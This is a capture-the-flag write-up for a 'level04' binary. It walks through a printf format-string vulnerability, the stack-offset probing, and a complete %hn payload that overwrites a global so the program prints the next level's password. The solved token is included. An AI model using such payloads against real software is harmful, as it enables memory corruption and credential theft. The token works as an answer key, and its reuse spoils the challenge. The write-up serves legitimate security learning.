# level04

1. Decompilation with Ghidra

    - Decompile the `level4` binary with Ghidra
    - The binary contains a function `n()` that:
      - Calls `fgets()` to read 512 bytes of user input (safe)
      - Calls `p()` that:
        - Calls `printf()` with user input as format string (vulnerable!)
      - Checks if global variable `m` equals `0x1025544` (16 930 116)
      - If true, calls `/bin/cat /home/user/level5/.pass")`

2. Analysis of the vulnerability

    The decompiled code is:

    ```c
    void n(void)

    {
        char local_20c [520];
  
        fgets(local_20c,0x200,stdin);
        p(local_20c);
        if (m == 0x1025544) {
            system("/bin/cat /home/user/level5/.pass");
        }
        return;
    }
    ```

    The vulnerability:
    - **Format string attack** via `printf(local_20c)` without format specifier
    - We need to modify the global variable `m` to be equal to `0x1025544` (16 930 116)
    - Using `%hn` format specifier, we can write to arbitrary memory addresses

3. Finding the address of global variable m

    Using objdump to find the symbol address:

    ```bash
    gdb ./level4
    info address m
    ```

    Symbol "m" is at **0x8049810** in a file compiled without debugging.
    (so "m+2" is at **0x8049812**)

4. Finding the format string offset

    Test to find where our input appears on the stack:

    ```bash
    echo "BBBB %x %x %x %x %x %x %x %x %x %x %x %x" | ./level4
    # Output BBBB b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 42424242
    ```

    We see `42424242` (AAAA in hex) at the **12th position**.

5. Exploit construction

    Strategy:

    Use 2-step writing with **%hn** to write the large value **0x1025544**

    Place addresses of m and m+2 at the beginning of the buffer

    Use format specifiers to control the byte counter

    Format string breakdown:
    text

    [\x12\x98\x04\x08][\x10\x98\x04\x08][%250x%12\$hn][%21570x%13\$hn]
    |                 |                 |             |
    |                 |                 |             +-> Write 21570 + 258 = 21828 (0x5544) to address at offset 13 (m)
    |                 |                 +-> Write 250 + 8 = 258 (0x0102) to address at offset 12 (m+2)
    |                 +-> Address of m (offset 13)
    +-> Address of m+2 (offset 12)

    Total bytes calculation:

        Initial: 8 bytes (2 addresses)

        After %250x: 8 + 250 = 258 = 0x0102 written to m+2

        After %21570x: 258 + 21570 = 21828 = 0x5544 written to m

    Final value in m: 0x01025544 = 0x1025544

6. Exploitation

    ```bash
    echo -e "\x12\x98\x04\x08\x10\x98\x04\x08%250x%12\$hn%21570x%13\$hn" | ./level4
    ```

7. Token discovered

    The token is: `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`
